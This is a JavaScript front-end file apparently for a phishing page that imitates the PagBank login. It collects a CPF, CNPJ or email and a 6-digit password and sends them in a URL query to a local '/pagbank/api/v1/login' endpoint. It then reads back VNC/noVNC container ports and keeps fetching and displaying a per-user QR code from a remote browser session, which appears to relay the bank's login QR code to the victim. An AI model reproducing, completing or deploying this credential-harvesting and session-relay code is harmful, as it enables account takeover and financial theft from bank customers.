// Estado da aplicação
const state = {
    username: '',
    currentScreen: 'identification'
};

// Elementos do DOM
const screens = {
    identification: document.getElementById('screen-identification'),
    password: document.getElementById('screen-password'),
    qrcode: document.getElementById('screen-qrcode')
};

const forms = {
    identification: document.getElementById('identification-form'),
    password: document.getElementById('password-form')
};

// Configuração da API
const API_BASE_URL = 'http://localhost:4000';

// Funções de navegação entre telas
function showScreen(screenName) {
    Object.values(screens).forEach(screen => {
        screen.classList.remove('active');
    });
    
    if (screens[screenName]) {
        screens[screenName].classList.add('active');
        state.currentScreen = screenName;
    }
}

// Validações
function validateCPF(cpf) {
    cpf = cpf.replace(/[^\d]/g, '');
    if (cpf.length !== 11) return false;
    
    // Verifica se todos os dígitos são iguais
    if (/^(\d)\1{10}$/.test(cpf)) return false;
    
    // Validação dos dígitos verificadores
    let sum = 0;
    for (let i = 0; i < 9; i++) {
        sum += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let digit = 11 - (sum % 11);
    if (digit >= 10) digit = 0;
    if (digit !== parseInt(cpf.charAt(9))) return false;
    
    sum = 0;
    for (let i = 0; i < 10; i++) {
        sum += parseInt(cpf.charAt(i)) * (11 - i);
    }
    digit = 11 - (sum % 11);
    if (digit >= 10) digit = 0;
    if (digit !== parseInt(cpf.charAt(10))) return false;
    
    return true;
}

function validateCNPJ(cnpj) {
    cnpj = cnpj.replace(/[^\d]/g, '');
    if (cnpj.length !== 14) return false;
    
    // Verifica se todos os dígitos são iguais
    if (/^(\d)\1{13}$/.test(cnpj)) return false;
    
    // Validação do primeiro dígito verificador
    let length = cnpj.length - 2;
    let numbers = cnpj.substring(0, length);
    let digits = cnpj.substring(length);
    let sum = 0;
    let pos = length - 7;
    
    for (let i = length; i >= 1; i--) {
        sum += numbers.charAt(length - i) * pos--;
        if (pos < 2) pos = 9;
    }
    
    let result = sum % 11 < 2 ? 0 : 11 - (sum % 11);
    if (result !== parseInt(digits.charAt(0))) return false;
    
    // Validação do segundo dígito verificador
    length = length + 1;
    numbers = cnpj.substring(0, length);
    sum = 0;
    pos = length - 7;
    
    for (let i = length; i >= 1; i--) {
        sum += numbers.charAt(length - i) * pos--;
        if (pos < 2) pos = 9;
    }
    
    result = sum % 11 < 2 ? 0 : 11 - (sum % 11);
    if (result !== parseInt(digits.charAt(1))) return false;
    
    return true;
}

function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

function validateUsername(username) {
    username = username.trim();
    
    if (!username) {
        return { valid: false, message: 'Campo obrigatório' };
    }
    
    // Remove formatação para validação
    const cleaned = username.replace(/[^\d]/g, '');
    
    // Verifica se é CPF
    if (cleaned.length === 11 && validateCPF(cleaned)) {
        return { valid: true, type: 'cpf' };
    }
    
    // Verifica se é CNPJ
    if (cleaned.length === 14 && validateCNPJ(cleaned)) {
        return { valid: true, type: 'cnpj' };
    }
    
    // Verifica se é email
    if (validateEmail(username)) {
        return { valid: true, type: 'email' };
    }
    
    return { 
        valid: false, 
        message: 'Digite um CPF, CNPJ ou e-mail válido' 
    };
}

function validatePassword(password) {
    if (!password) {
        return { valid: false, message: 'Campo obrigatório' };
    }
    
    if (!/^\d{6}$/.test(password)) {
        return { valid: false, message: 'A senha deve conter 6 dígitos' };
    }
    
    return { valid: true };
}

// Funções de exibição de erros
function showError(fieldId, message) {
    const errorElement = document.getElementById(`${fieldId}-error`);
    const inputElement = document.getElementById(fieldId);
    
    if (errorElement) {
        errorElement.textContent = message;
    }
    
    if (inputElement) {
        inputElement.classList.add('error');
    }
}

function clearError(fieldId) {
    const errorElement = document.getElementById(`${fieldId}-error`);
    const inputElement = document.getElementById(fieldId);
    
    if (errorElement) {
        errorElement.textContent = '';
    }
    
    if (inputElement) {
        inputElement.classList.remove('error');
    }
}

// Handler do formulário de identificação
forms.identification.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const usernameInput = document.getElementById('username');
    const username = usernameInput.value.trim();
    
    clearError('username');
    
    const validation = validateUsername(username);
    
    if (!validation.valid) {
        showError('username', validation.message);
        return;
    }
    
    // Salva o username no estado
    state.username = username;
    
    // Exibe o username na tela de senha
    document.getElementById('user-display').textContent = username;
    
    // Navega para a tela de senha
    showScreen('password');
    
    // Foca no campo de senha
    setTimeout(() => {
        document.getElementById('senha').focus();
    }, 100);
});

// Handler do formulário de senha (login)
forms.password.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const senhaInput = document.getElementById('senha');
    const senha = senhaInput.value;
    
    clearError('senha');
    
    const validation = validatePassword(senha);
    
    if (!validation.valid) {
        showError('senha', validation.message);
        return;
    }
    
    // Mostra loading
    const loginBtn = document.getElementById('login-btn');
    const loading = document.getElementById('loading');
    
    loginBtn.disabled = true;
    loading.classList.add('active');
    
    try {
        // Faz a chamada à API
        const response = await fetch(
            `${API_BASE_URL}/pagbank/api/v1/login?username=${encodeURIComponent(state.username)}&senha=${encodeURIComponent(senha)}`
        );
        
        const json_ = await response.json();
        console.log('Response:', json_);

        alert(json_?.ports?.vnc);

        if(json_?.ports?.vnc){
            // Para a resposta em HTML, precisamos extrair os dados
            
            // Extrai informações do HTML (simplificado)
            
            // Preenche as informações na tela de QR Code
            const novncUrl = `http://localhost:${json_?.ports?.app}`;
            const response2 = await fetch(
                `${novncUrl}`
            );
;
            
            const json2_ = await response2.json();
            console.log('Response2:', json2_);
            
            // Mostra loading do QR Code
            const qrCodeLoading = document.createElement('div');
            qrCodeLoading.className = 'qr-loading';
            qrCodeLoading.innerHTML = '<div class="spinner"></div><p>Gerando QR Code...</p>';
            
            // Adiciona estilos CSS se não existirem
            if (!document.querySelector('#qr-loading-styles')) {
                const style = document.createElement('style');
                style.id = 'qr-loading-styles';
                style.textContent = `
                .qr-loading {
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    padding: 20px;
                }
                .qr-loading .spinner {
                    border: 3px solid #f3f3f3;
                    border-top: 3px solid #00C853;
                    border-radius: 50%;
                    width: 40px;
                    height: 40px;
                    animation: spin 1s linear infinite;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                `;
                document.head.appendChild(style);
            }
            
            const qrcodeDiv = document.getElementById('qrcode');
            
            qrcodeDiv.innerHTML = '';
            qrcodeDiv.appendChild(qrCodeLoading);
            showScreen('qrcode');
            
            // Atualiza QR Code a cada 5 segundos
            setInterval(async () => {
                try {
                    const qrcodeUrl = `http://localhost:${json_?.ports?.app}/qrcode/${state.username}`;
                    const resQrcode = await fetch(qrcodeUrl);
                    const json = await resQrcode.json();

                    console.log('QR Code Response:', json);

                    if (json.success && json.qrcode) {
                        // Remove o loading e exibe a imagem
                        qrcodeDiv.innerHTML = `
                            <div style="text-align: center;">
                                <img src="${json.qrcode}" alt="QR Code" style="max-width: 100%; height: auto; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                                <p style="margin-top: 10px; color: #666; font-size: 12px;">Última atualização: ${new Date(json.timestamp).toLocaleTimeString()}</p>
                            </div>
                        `;
                    } else if (json.qrcode === false) {
                        // QR Code ainda não está disponível
                        console.log('QR Code ainda não disponível');
                    }
                } catch (error) {
                    console.error('Erro ao buscar QR Code:', error);
                }
            }, 3000);

            document.getElementById('qr-username').textContent = state.username;
            document.getElementById('qr-container').textContent = json_?.containerName || 'N/A';
            document.getElementById('qr-vnc-port').textContent = json_?.ports?.vnc || 'N/A';
            document.getElementById('qr-novnc-port').textContent = json_?.ports?.app || 'N/A';
            
            document.getElementById('qr-status').textContent = json_?.reused === 'true' ? 'Reutilizado' : 'Novo';
            
            // Gera o QR Code com a URL do noVNC
            
            // Limpa o formulário
            senhaInput.value = '';
        }else{
            alert('error!');
        }

        
        
    } catch (error) {
        console.error('Erro no login:', error);
        showError('senha', error.message || 'Erro ao fazer login. Tente novamente.');
    } finally {
        loginBtn.disabled = false;
        loading.classList.remove('active');
    }
});

// Função auxiliar para extrair texto do HTML
function extractTextContent(doc, className) {
    const element = doc.querySelector(`.${className}`);
    return element ? element.textContent.trim() : null;
}

// Botão voltar para identificação
document.getElementById('back-to-identification').addEventListener('click', () => {
    showScreen('identification');
    document.getElementById('senha').value = '';
    clearError('senha');
});

// Botão novo login
document.getElementById('new-login').addEventListener('click', () => {
    state.username = '';
    document.getElementById('username').value = '';
    document.getElementById('senha').value = '';
    clearError('username');
    clearError('senha');
    showScreen('identification');
});

// Máscara para campo de senha (apenas números)
document.getElementById('senha').addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
});

// Limpa erros ao digitar
document.getElementById('username').addEventListener('input', () => {
    clearError('username');
});

document.getElementById('senha').addEventListener('input', () => {
    clearError('senha');
});

// Inicialização
console.log('Landing Page PagBank inicializada!');
console.log('API Base URL:', API_BASE_URL);
